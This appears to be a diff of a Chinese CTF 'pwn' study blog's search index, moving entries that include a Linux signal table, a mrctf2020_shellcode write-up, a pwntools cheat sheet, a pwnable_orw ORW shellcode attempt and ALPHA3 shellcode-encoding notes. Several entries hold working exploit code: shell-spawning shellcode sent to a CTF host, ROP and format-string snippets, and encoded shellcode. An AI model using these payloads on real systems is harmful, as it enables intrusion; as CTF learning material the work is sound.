@@ -356,253 +356,6 @@ PIE机制原理PIE技术是一个针对代码段（.text）、数据段（.data�
       </tags>
   </entry>
   <entry>
-    <title>Linux退出状态码</title>
-    <url>//docx/Linux%E9%80%80%E5%87%BA%E7%8A%B6%E6%80%81%E7%A0%81/</url>
-    <content><![CDATA[
-
-
-信号编号
-信号名称
-信号描述
-默认处理方式
-Exit code
-
-
-
-1.
-SIGHUP
-挂起
-终止
-1.
-
-
-2.
-SIGINT
-终端中断
-终止
-2.
-
-
-3.
-SIGQUIT
-终端退出
-终止、core dump
-131.
-
-
-4.
-SIGILL
-非法指令
-终止、core dump
-132.
-
-
-5.
-SIGTRAP
-跟踪 &#x2F; 断点陷阱
-终止、core dump
-133.
-
-
-6.
-SIGABRT
-终止进程
-终止、core dump
-134.
-
-
-7.
-SIGBUS
-Bus error
-终止、core dump
-135.
-
-
-8.
-SIGFPE
-算术异常
-终止、core dump
-136.
-
-
-9.
-SIGKILL
-杀死进程（必杀）
-终止
-9.
-
-
-10.
-SIGUSR1
-用户自定义信号 1
-终止
-10.
-
-
-11.
-SIGSEGV
-段错误
-终止、core dump
-139.
-
-
-12.
-SIGUSR2
-用户自定义信号 2
-终止
-12.
-
-
-13.
-SIGPIPE
-管道断开
-终止
-13.
-
-
-14.
-SIGALRM
-定时器信号
-终止
-14.
-
-
-15.
-SIGTERM
-终止进程
-终止
-15.
-
-
-16.
-SIGSTKFLT
-栈错误
-终止
-16.
-
-
-17.
-SIGCHLD
-子进程退出
-忽略
-无
-
-
-18.
-SIGCONT
-继续执行
-若停止则继续执行
-无
-
-
-19.
-SIGSTOP
-停止执行（必停）
-暂停执行
-无
-
-
-20.
-SIGTSTP
-停止
-暂停执行
-无
-
-
-21.
-SIGTTIN
-Stopped (tty input)
-暂停执行
-无
-
-
-22.
-SIGTTOU
-Stopped (tty output)
-暂停执行
-无
-
-
-23.
-SIGURG
-IO 紧急数据
-忽略
-无
-
-
-24.
-SIGXCPU
-突破对 cpu 时间的限制
-终止、core dump
-152.
-
-
-25.
-SIGXFSZ
-突破对文件大小的限制
-终止、core dump
-153.
-
-
-26.
-SIGVTALRM
-虚拟定时器超时
-终止
-26.
-
-
-27.
-SIGPROF
-性能分析定时器超时
-终止
-27.
-
-
-28.
-SIGWINCH
-终端窗口尺寸发生变化
-忽略
-无
-
-
-29.
-SIGIO
-IO 时可能产生
-终止
-29.
-
-
-30.
-SIGPWR
-电量行将耗尽
-终止
-30.
-
-
-31.
-SIGSYS
-错误的系统调用
-终止、core dump
-159.
-
-
-34~64
-SIGRTMIN~SIGRTMAX
-实时信号
-
-
-
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN攻略-所需表格</tag>
-        <tag>计算机原理相关表格</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ASCII码</title>
     <url>//docx/ASCII%E7%A0%81/</url>
     <content><![CDATA[
@@ -1758,6 +1511,253 @@ from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, 
       </tags>
   </entry>
   <entry>
+    <title>Linux退出状态码</title>
+    <url>//docx/Linux%E9%80%80%E5%87%BA%E7%8A%B6%E6%80%81%E7%A0%81/</url>
+    <content><![CDATA[
+
+
+信号编号
+信号名称
+信号描述
+默认处理方式
+Exit code
+
+
+
+1.
+SIGHUP
+挂起
+终止
+1.
+
+
+2.
+SIGINT
+终端中断
+终止
+2.
+
+
+3.
+SIGQUIT
+终端退出
+终止、core dump
+131.
+
+
+4.
+SIGILL
+非法指令
+终止、core dump
+132.
+
+
+5.
+SIGTRAP
+跟踪 &#x2F; 断点陷阱
+终止、core dump
+133.
+
+
+6.
+SIGABRT
+终止进程
+终止、core dump
+134.
+
+
+7.
+SIGBUS
+Bus error
+终止、core dump
+135.
+
+
+8.
+SIGFPE
+算术异常
+终止、core dump
+136.
+
+
+9.
+SIGKILL
+杀死进程（必杀）
+终止
+9.
+
+
+10.
+SIGUSR1
+用户自定义信号 1
+终止
+10.
+
+
+11.
+SIGSEGV
+段错误
+终止、core dump
+139.
+
+
+12.
+SIGUSR2
+用户自定义信号 2
+终止
+12.
+
+
+13.
+SIGPIPE
+管道断开
+终止
+13.
+
+
+14.
+SIGALRM
+定时器信号
+终止
+14.
+
+
+15.
+SIGTERM
+终止进程
+终止
+15.
+
+
+16.
+SIGSTKFLT
+栈错误
+终止
+16.
+
+
+17.
+SIGCHLD
+子进程退出
+忽略
+无
+
+
+18.
+SIGCONT
+继续执行
+若停止则继续执行
+无
+
+
+19.
+SIGSTOP
+停止执行（必停）
+暂停执行
+无
+
+
+20.
+SIGTSTP
+停止
+暂停执行
+无
+
+
+21.
+SIGTTIN
+Stopped (tty input)
+暂停执行
+无
+
+
+22.
+SIGTTOU
+Stopped (tty output)
+暂停执行
+无
+
+
+23.
+SIGURG
+IO 紧急数据
+忽略
+无
+
+
+24.
+SIGXCPU
+突破对 cpu 时间的限制
+终止、core dump
+152.
+
+
+25.
+SIGXFSZ
+突破对文件大小的限制
+终止、core dump
+153.
+
+
+26.
+SIGVTALRM
+虚拟定时器超时
+终止
+26.
+
+
+27.
+SIGPROF
+性能分析定时器超时
+终止
+27.
+
+
+28.
+SIGWINCH
+终端窗口尺寸发生变化
+忽略
+无
+
+
+29.
+SIGIO
+IO 时可能产生
+终止
+29.
+
+
+30.
+SIGPWR
+电量行将耗尽
+终止
+30.
+
+
+31.
+SIGSYS
+错误的系统调用
+终止、core dump
+159.
+
+
+34~64
+SIGRTMIN~SIGRTMAX
+实时信号
+
+
+
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN攻略-所需表格</tag>
+        <tag>计算机原理相关表格</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[NewStarCTF 2023 公开赛道]shell code revenge</title>
     <url>//docx/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/</url>
     <content><![CDATA[
@@ -2057,6 +2057,63 @@ from pwn import *file_path = &#x27;./jarvisoj_level2_x64&#x27;context(log_level 
       </tags>
   </entry>
   <entry>
+    <title>mrctf2020_shellcode</title>
+    <url>//docx/mrctf2020_shellcode/</url>
+    <content><![CDATA[
+类型：pwn、shellcode 
+https://buuoj.cn/challenges#mrctf2020_shellcode
+
+首先检查文件
+
+大概了解情况之后，根据题目标题，我大概知道是shellcode，然后打开IDA查看一下代码长啥样。
+
+一整个流程是这样的，然后F5也没有办法正常反编译成伪C。
+
+整个使用流程大概如此。
+再回到汇编，在输出之后可以让我读取值。因为call了read函数
+#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);//其中，fd是文件描述符//buf是指向数据将被读取的缓冲区的指针//而count是期望读取的字节数//当调用read函数时，它会尝试从fd指向的文件中读取count个字节的数据到buf所指向的内存中。如果读取成功，函数返回实际读取到的字节数；如果读取到文件末尾或没有可读取的数据，函数返回0；如果发生错误，则返回-1，并将错误代码存入errno中。
+
+
+这边题目给了不少备注，在程序的一开始用了一个buf什么-410h，这个就是rbp的缓冲区。然后在这个下面的时候edx400h的意思是给read函数提供了400h的缓冲区。也就是说我可以输入400的内容并且不会栈溢出。
+通过lea操作符，rax获取了rbp+buf的地址，如果main函数栈从0开始，那么rax现在值就是栈中地址-410h。
+通过read函数不难发现，读取值的void *buf是一个空类型指针，将rax的地址交给他开始读取数据。此时此刻，栈中的数据会被rsi寄存器（这边的寄存器被当作指针用，获取string数据）
+在这里，程序要获取400h的值，那相当多了。获取这些数据要干嘛？接着往下找：
+
+然后，通过一个jg进行跳转，我们先不管这个jump greater的条件。不难发现当判断正确的时候（也就是蓝色的线），会再一次把rbp+buf这个地址交给rax，此时此刻rax就是指向我们刚刚才输入进去的数据的。然后使用了call指令，也就会导致我们输入进去的数据在栈中会被执行。
+我们再回来看这个比较到底是啥：首先mov了eax的值到rbp+ver_4的位置，然后将0和这个值进行比较，如果大于那么就跳转到蓝色部分，否则红色部分。
+不过在read函数调用之前我们就发现，mov eax,0已经把eax寄存器中的值变成0。
+
+在gdb调试后的时候非常神奇，我们的eax虽然被归0了，但是似乎使用完read函数之后，他就莫名其妙的得到了一个0xA的值（并非莫名其妙，最后会讲）。不管如何，他现在反正是大于0的。于是乎我们接下来输入的东西就会被正常执行了，可喜可贺。
+from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)shellcode = asm(shellcraft.sh())p = remote(&quot;node5.buuoj.cn&quot;,26437)#p = process(&quot;./mrctf2020_shellcode&quot;)payload = shellcodep.send(payload)p.interactive()
+
+直接用自带工具构造一个shellcode做成payload，一把梭直接结束。
+
+ls后flag在根目录下，直接cat，然后结束。
+孩子们，我们是不是忘记那个奇怪的eax怎么获得0x0A的值了？
+是的，现在我们来回顾一下这个傻逼read函数：
+#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);
+
+fd.、.buf.、.count分别对应edi，rsi和edx三个寄存器。那么ssize_t类型的返回值去哪里了？
+我们做一个实验，其实有理论可以直接说，不过实验对于我而言印象会更深刻。
+
+我们写一个带有返回值的函数，然后编译之后gdb调试一下：
+
+当我们把add中的return给运行完的时候，返回值也就是10+20&#x3D;&#x3D;30，30也就是0x1e的值出现在了rax寄存器上，也就是说，我这个函数运行完之后的返回值会返回到rax寄存器上。而_read函数的返回值是读取了多少数据他就返回多少，于是乎在我们运行完之后，rax的值变成了0x0A。
+也就是说，返回值会默认给0x0A。所以我可以逆向一下，大概源程序的代码是这样的：
+#include &lt;stdio.h&gt;int main() &#123;    setbuf(0,0);    setbuf(0,0);    setbuf(0,0);    char str[410];    if(read(0,str,0x400)&gt;0)        call(str);    return 0;&#125;
+
+这个只是伪C代码，大概这样写不能还原题目。就这样吧…
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN的writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>main_dahuan01</title>
     <url>//docx/main_dahuan01/</url>
     <content><![CDATA[
@@ -2181,63 +2238,6 @@ from pwn import *#32context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x2
       </tags>
   </entry>
   <entry>
-    <title>mrctf2020_shellcode</title>
-    <url>//docx/mrctf2020_shellcode/</url>
-    <content><![CDATA[
-类型：pwn、shellcode 
-https://buuoj.cn/challenges#mrctf2020_shellcode
-
-首先检查文件
-
-大概了解情况之后，根据题目标题，我大概知道是shellcode，然后打开IDA查看一下代码长啥样。
-
-一整个流程是这样的，然后F5也没有办法正常反编译成伪C。
-
-整个使用流程大概如此。
-再回到汇编，在输出之后可以让我读取值。因为call了read函数
-#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);//其中，fd是文件描述符//buf是指向数据将被读取的缓冲区的指针//而count是期望读取的字节数//当调用read函数时，它会尝试从fd指向的文件中读取count个字节的数据到buf所指向的内存中。如果读取成功，函数返回实际读取到的字节数；如果读取到文件末尾或没有可读取的数据，函数返回0；如果发生错误，则返回-1，并将错误代码存入errno中。
-
-
-这边题目给了不少备注，在程序的一开始用了一个buf什么-410h，这个就是rbp的缓冲区。然后在这个下面的时候edx400h的意思是给read函数提供了400h的缓冲区。也就是说我可以输入400的内容并且不会栈溢出。
-通过lea操作符，rax获取了rbp+buf的地址，如果main函数栈从0开始，那么rax现在值就是栈中地址-410h。
-通过read函数不难发现，读取值的void *buf是一个空类型指针，将rax的地址交给他开始读取数据。此时此刻，栈中的数据会被rsi寄存器（这边的寄存器被当作指针用，获取string数据）
-在这里，程序要获取400h的值，那相当多了。获取这些数据要干嘛？接着往下找：
-
-然后，通过一个jg进行跳转，我们先不管这个jump greater的条件。不难发现当判断正确的时候（也就是蓝色的线），会再一次把rbp+buf这个地址交给rax，此时此刻rax就是指向我们刚刚才输入进去的数据的。然后使用了call指令，也就会导致我们输入进去的数据在栈中会被执行。
-我们再回来看这个比较到底是啥：首先mov了eax的值到rbp+ver_4的位置，然后将0和这个值进行比较，如果大于那么就跳转到蓝色部分，否则红色部分。
-不过在read函数调用之前我们就发现，mov eax,0已经把eax寄存器中的值变成0。
-
-在gdb调试后的时候非常神奇，我们的eax虽然被归0了，但是似乎使用完read函数之后，他就莫名其妙的得到了一个0xA的值（并非莫名其妙，最后会讲）。不管如何，他现在反正是大于0的。于是乎我们接下来输入的东西就会被正常执行了，可喜可贺。
-from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)shellcode = asm(shellcraft.sh())p = remote(&quot;node5.buuoj.cn&quot;,26437)#p = process(&quot;./mrctf2020_shellcode&quot;)payload = shellcodep.send(payload)p.interactive()
-
-直接用自带工具构造一个shellcode做成payload，一把梭直接结束。
-
-ls后flag在根目录下，直接cat，然后结束。
-孩子们，我们是不是忘记那个奇怪的eax怎么获得0x0A的值了？
-是的，现在我们来回顾一下这个傻逼read函数：
-#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);
-
-fd.、.buf.、.count分别对应edi，rsi和edx三个寄存器。那么ssize_t类型的返回值去哪里了？
-我们做一个实验，其实有理论可以直接说，不过实验对于我而言印象会更深刻。
-
-我们写一个带有返回值的函数，然后编译之后gdb调试一下：
-
-当我们把add中的return给运行完的时候，返回值也就是10+20&#x3D;&#x3D;30，30也就是0x1e的值出现在了rax寄存器上，也就是说，我这个函数运行完之后的返回值会返回到rax寄存器上。而_read函数的返回值是读取了多少数据他就返回多少，于是乎在我们运行完之后，rax的值变成了0x0A。
-也就是说，返回值会默认给0x0A。所以我可以逆向一下，大概源程序的代码是这样的：
-#include &lt;stdio.h&gt;int main() &#123;    setbuf(0,0);    setbuf(0,0);    setbuf(0,0);    char str[410];    if(read(0,str,0x400)&gt;0)        call(str);    return 0;&#125;
-
-这个只是伪C代码，大概这样写不能还原题目。就这样吧…
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-        <tag>PWN的writeup</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pwntools</title>
     <url>//docx/pwntools/</url>
     <content><![CDATA[下载python3版本这个就去看我写的pwn基础配置吧，一般而言不做老题目的话python3适配的pwntools完全够用了。不过我为了测试和学习一些老东西留下的宝贵信息，还是会用到适配python2的pwntools的。
@@ -2254,6 +2254,108 @@ pip2 install --user pyelftools==0.27pip2 install --user --upgrade &#x27;pwntools
 使用pwntools的使用非常简单，记住一些简单的函数就可以用起来了：
 这边写一个简单的脚本，主要是看函数的：
 from pwn import *# ===== 基础设置 =====context(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)  # 设置架构为64位# context(arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)  # 设置架构为32位（取消注释使用）# ===== 连接方式 =====# p = remote(&#x27;host&#x27;, 1234)       # 远程连接p = process(&#x27;./binary&#x27;)         # 本地进程# p = gdb.debug(&#x27;./binary&#x27;)     # 带GDB调试# ===== 数据发送 =====p.send(b&#x27;data&#x27;)                 # 直接发送数据p.sendline(b&#x27;data\n&#x27;)           # 发送数据并添加换行p.sendafter(b&#x27;prompt: &#x27;, b&#x27;data&#x27;)  # 等待提示后发送p.sendlineafter(b&#x27;prompt: &#x27;, b&#x27;data&#x27;)  # 等待提示后发送并换行# ===== 数据接收 =====data = p.recv()                 # 接收所有数据data = p.recv(1024)             # 接收指定字节数data = p.recvline()             # 接收一行数据data = p.recvuntil(b&#x27;delim&#x27;)    # 接收直到遇到分隔符data = p.recvregex(b&#x27;pattern&#x27;)  # 接收直到匹配正则表达式# ===== 内存操作 =====# 64位addr = 0x123456789ABCDEF0payload = b&#x27;A&#x27;*40 + p64(addr)   # 64位地址填充value = u64(b&#x27;\xef\xcd\xab\x89\x67\x45\x23\x01&#x27;)  # 字节转64位整数# 32位（取消注释使用）# addr = 0x12345678# payload = b&#x27;A&#x27;*40 + p32(addr)  # 32位地址填充# value = u32(b&#x27;\x78\x56\x34\x12&#x27;)  # 字节转32位整数# ===== 高级功能 =====# 格式化字符串漏洞利用payload = fmtstr_payload(6, &#123;elf.got.puts: elf.plt.system&#125;)# ROP链构建elf = ELF(&#x27;./binary&#x27;)rop = ROP(elf)rop.call(elf.plt.puts, [elf.got.puts])  # 泄露puts地址rop.call(elf.symbols.main)              # 返回mainp.sendline(rop.chain())# Libc地址计算libc = ELF(&#x27;./libc.so.6&#x27;)puts_leak = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))libc.address = puts_leak - libc.symbols.puts# 执行系统命令rop = ROP(libc)rop.system(next(libc.search(b&#x27;/bin/sh&#x27;)))p.sendline(rop.chain())# ===== 其他功能 =====shellcode = asm(shellcraft.sh())  # 生成shellcodep.sendline(shellcode)p.interactive()                   # 进入交互式shellp.close()                         # 关闭连接
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN的工具笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwnable_orw【有问题】</title>
+    <url>//docx/pwnable_orw%E3%80%90%E6%9C%89%E9%97%AE%E9%A2%98%E3%80%91/</url>
+    <content><![CDATA[
+Shellcode、ORW
+https://buuoj.cn/challenges#pwnable_orw
+
+首先checksec
+
+32位系统下，栈可执行，有金丝雀。看一下代码：
+
+代码相当简单，有一个seccomp的初始化，然后read了一个shellcode（字符串），然后以shellcode字符串的地址直接在栈上执行。根据题目叫做pwn able orw，也就是一道考察ORW syscall的题目。
+查看一下seccomp启用呢？
+
+启用了open、read、write和exit，还有一个什么sigreturn和rt_sigreturn，和一个架构。
+之前写过类似的题目，详细记录在这：shellcode1_dahuan02
+不过这个是32位系统的，我们按照32位做一个ORWshellcode就可以了
+from pwn import *# r = process(&quot;./orw&quot;)r = process(&#x27;./orw&#x27;)elf = ELF(&#x27;./orw&#x27;)# r = remote(&#x27;node5.buuoj.cn&#x27;,27768)bss_addr = elf.bss()# gdb.attach(r,&#x27;b main&#x27;)# shellcode = shellcraft.open(&#x27;flag&#x27;)# shellcode += shellcraft.read(3, bss_addr, 0x100)# shellcode += shellcraft.write(1, bss_addr, 0x100)shellcode = &quot;&quot;&quot;    mov ebx, 0x67616c66    xor ecx, ecx    xor edx, edx    mov eax, 5    int 0x80    mov ebx,3    mov ecx, 0x804a040    xor edx, edx    mov dh, 0x100 &gt;&gt; 8    mov eax,3    int 0x80    mov ebx, 1    mov ecx,0x804a040    xor edx, edx    mov dh, 0x100 &gt;&gt; 8    mov eax,4    int 0x80&quot;&quot;&quot;print(shellcode)shellcode = asm(shellcode, arch = &#x27;i386&#x27;, os=&#x27;linux&#x27;)r.sendline(shellcode)r.interactive()
+
+但是很可惜的是不知道为什么这道题目没有办法写出来。不管是本地还是远程都有段错误。这个段错误非常的奇怪，不知为何就是解决不了。而且我看别人的视频里面的解法里面也是有段错误的，但是非常奇怪别人可以正常获得flag。
+
+
+
+
+3
+read
+0x03
+unsigned int fd
+char *buf
+size_t count
+
+
+
+4
+write
+0x04
+unsigned int fd
+const char *buf
+size_t count
+
+
+5
+open
+0x05
+const char *filename
+int flags
+umode_t mode
+
+
+以后有时间在解决吧。这个问题。
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN的writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellcode - alpha3.py</title>
+    <url>//docx/shellcode%20-%20alpha3.py/</url>
+    <content><![CDATA[下载ALPHA3ALPHA3实际上只是配windows，不过有国人制作了适配linux版本的。因为我的环境大多数都是在linux上，所以我直接下载国人修改制作的适配linux版本的ALPHA3：（我也只写了linux教程）
+git clone https://github.com/TaQini/alpha3.git
+
+我把这个py脚本git到了我的~&#x2F;Software文件夹下。
+
+直接运行会报错。我是真不理解这是什么错误。上网找了一些教程，最终发现感觉这个文件只支持python2运行。
+那么我就要在我的ubuntu里面安装一个python2环境，还要和python3环境兼容
+python2环境
+这个时候，我们可以用python2来运行程序了。
+
+使用用起来太麻烦了，每次都要进入这个傻逼目录里面他妈的调用这个傻逼脚本的话，太他妈的麻烦了。我决定创造一个链接，让我可以无时无刻用。
+为此我要创建一个叫做.links的隐藏文件夹在我的用户目录下，然后往里面塞链接。
+mkdir ~/.linkssudo ln -s ~/Softwares/alpha3/ALPHA3.py ~/.link/ALPHA3.py
+
+在做一个scmker.py文件，这个放在我的vscode里面，再弄一个ln出去玩：
+sudo ln -s /home/kanyo/pwn_test/pwncodes/python/scmker/scmker.py ~/.link/scmker.py
+
+测试一下：
+#python ~/.link/scmker.py &gt; ~/.link/shellcode#python2 ~/.link/ALPHA3.py x64 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;#python2 ~/.link/ALPHA3.py x32 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;from pwn import *context.arch=&#x27;amd64&#x27;#context/arch=&#x27;x86_64&#x27;sc = shellcraft.sh()print(asm(sc))
+
+
+非常完美。其实这个代码还需要配合控制台用有点傻逼。不过我现在没有修改他的想法。等我哪天做题崩溃了再来补充吧~、
+后注：似乎python3版本的pwntool威力有点强大，导致有一个问题：为了避免很多不必要的bug，python3的shellcraft又臭又长。
+Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01
+
+上面使用python3生成的shellcode，下面是python2的老版本pwntools生成的shellcode：
+Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
+
+快他妈的两倍了。所以代码最好改成：
+#全部改用python2#python2 ~/.link/scmker.py &gt; ~/.link/shellcode#python2 ~/.link/ALPHA3.py x64 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;#python2 ~/.link/ALPHA3.py x32 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;from pwn import *context.arch=&#x27;amd64&#x27;#context/arch=&#x27;x86_64&#x27;sc = shellcraft.sh()print(asm(sc))
 
 ]]></content>
       <categories>
@@ -2428,171 +2530,6 @@ _start和main()  没什么好说，就是启动后让用户可以看到程序的
       </tags>
   </entry>
   <entry>
-    <title>pwn基础配置</title>
-    <url>//docx/pwn%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[ubuntu系统和windows系统
-做pwn前需要准备的工具：
-一些虚拟机配置鼠标拖拽控制
-这个服务打开即可
-安装软件linux需要在前面加sudo哈
-网络环境配置默认主机有clash或其他vpn工具。
-
-允许局域网和端口要记住并且打开，系统代理在你需要打开vpn的时候打开即可。
-虚拟机调为NAT连接模式。
-
-在ubuntu的settings中proxy（代理）调整为manual（手动），把http和https的proxy改成相应的URL和Port
-
-端口号就和前面的一样，URL就是vmware给虚拟机的地址，查看方式如图所示： 
-
-基础环境配置python3#首先进入root模式sudo apt updatesudo apt install python3sudo apt install python3-pipalias python=&#x27;/usr/bin/python3&#x27;
-
-一般只需要python3，如果需要python2的话可以看：
-python2环境
-按照这样安装一轮应该就可以了，不要乱删东西。如果不想安装pip可以试下面的第二种办法安装pwntools
-Pwntoolspython库
-sudo pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple#或者sudo apt install python3-pwntools
-
-Wine用来在linux环境下使用windows程序的…一般而言不需要
-apt-get install wine
-
-Gdb &amp; pwndbg调试程序
-apt install gdbapt install gitgit clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.shvim ~/.gdbinit#进入到vim之后，输入人source [pwndbg的位置]/gdbinit.py#比如:source /home/kanyo/pwndbg/gdbinit.py
-
-One_gadget一种工具，从libc中直接找到一个构造ROP的地址。
-apt install rubyapt install gemgem install one_gadgetpip3 install --break-system-packages ropper #我建议用这个
-
-因为ROPgadget需要用grep管道指令搜索，有点麻烦
-可以直接用ropper来查询
-ropper --file [filename] --search &#x27;[words]&#x27;
-
-LibcSearcher#libcSearcher有时候不会准，这里提供一个网站：#http://libc.blukat.me#下面是libc安装git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearcherpython setup.py develop
-
-main_arena_offset堆题
-https://github.com/bash-c/main_arena_offset#shell脚本，直接下载使用即可，用来搜索堆偏移量的https://github.com/zarkivy/py_main_arena_offset#这个是python包装好的，内核还是上面的shell脚本，不过可以在python里面使用
-
-seccomp-tools用来查被禁用的syscall的
-sudo apt install gcc ruby-dev #依赖sudo gem install seccomp-tools
-
-其他常用apt install vimapt install checksec
-
-IDA Prowindows下直接安装即可
-alpha3.git这个软件是用来shellcode字符化的，但是真的他妈的太难用了。
-看这个吧：alpha3.py
-AE64alpha3对32位的shellcode适配性比较高，不过我们可以试试这个AE64来写64位的题目：
-git clone https://github.com/veritas501/ae64.git --depth 1cd ae64sudo python3 setup.py install
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN攻略-前提</tag>
-        <tag>计算机原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>shellcode - alpha3.py</title>
-    <url>//docx/shellcode%20-%20alpha3.py/</url>
-    <content><![CDATA[下载ALPHA3ALPHA3实际上只是配windows，不过有国人制作了适配linux版本的。因为我的环境大多数都是在linux上，所以我直接下载国人修改制作的适配linux版本的ALPHA3：（我也只写了linux教程）
-git clone https://github.com/TaQini/alpha3.git
-
-我把这个py脚本git到了我的~&#x2F;Software文件夹下。
-
-直接运行会报错。我是真不理解这是什么错误。上网找了一些教程，最终发现感觉这个文件只支持python2运行。
-那么我就要在我的ubuntu里面安装一个python2环境，还要和python3环境兼容
-python2环境
-这个时候，我们可以用python2来运行程序了。
-
-使用用起来太麻烦了，每次都要进入这个傻逼目录里面他妈的调用这个傻逼脚本的话，太他妈的麻烦了。我决定创造一个链接，让我可以无时无刻用。
-为此我要创建一个叫做.links的隐藏文件夹在我的用户目录下，然后往里面塞链接。
-mkdir ~/.linkssudo ln -s ~/Softwares/alpha3/ALPHA3.py ~/.link/ALPHA3.py
-
-在做一个scmker.py文件，这个放在我的vscode里面，再弄一个ln出去玩：
-sudo ln -s /home/kanyo/pwn_test/pwncodes/python/scmker/scmker.py ~/.link/scmker.py
-
-测试一下：
-#python ~/.link/scmker.py &gt; ~/.link/shellcode#python2 ~/.link/ALPHA3.py x64 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;#python2 ~/.link/ALPHA3.py x32 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;from pwn import *context.arch=&#x27;amd64&#x27;#context/arch=&#x27;x86_64&#x27;sc = shellcraft.sh()print(asm(sc))
-
-
-非常完美。其实这个代码还需要配合控制台用有点傻逼。不过我现在没有修改他的想法。等我哪天做题崩溃了再来补充吧~、
-后注：似乎python3版本的pwntool威力有点强大，导致有一个问题：为了避免很多不必要的bug，python3的shellcraft又臭又长。
-Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01
-
-上面使用python3生成的shellcode，下面是python2的老版本pwntools生成的shellcode：
-Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
-
-快他妈的两倍了。所以代码最好改成：
-#全部改用python2#python2 ~/.link/scmker.py &gt; ~/.link/shellcode#python2 ~/.link/ALPHA3.py x64 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;#python2 ~/.link/ALPHA3.py x32 ascii mixedcase rax --input=&quot;$HOME/.link/shellcode&quot;from pwn import *context.arch=&#x27;amd64&#x27;#context/arch=&#x27;x86_64&#x27;sc = shellcraft.sh()print(asm(sc))
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN的工具笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwnable_orw【有问题】</title>
-    <url>//docx/pwnable_orw%E3%80%90%E6%9C%89%E9%97%AE%E9%A2%98%E3%80%91/</url>
-    <content><![CDATA[
-Shellcode、ORW
-https://buuoj.cn/challenges#pwnable_orw
-
-首先checksec
-
-32位系统下，栈可执行，有金丝雀。看一下代码：
-
-代码相当简单，有一个seccomp的初始化，然后read了一个shellcode（字符串），然后以shellcode字符串的地址直接在栈上执行。根据题目叫做pwn able orw，也就是一道考察ORW syscall的题目。
-查看一下seccomp启用呢？
-
-启用了open、read、write和exit，还有一个什么sigreturn和rt_sigreturn，和一个架构。
-之前写过类似的题目，详细记录在这：shellcode1_dahuan02
-不过这个是32位系统的，我们按照32位做一个ORWshellcode就可以了
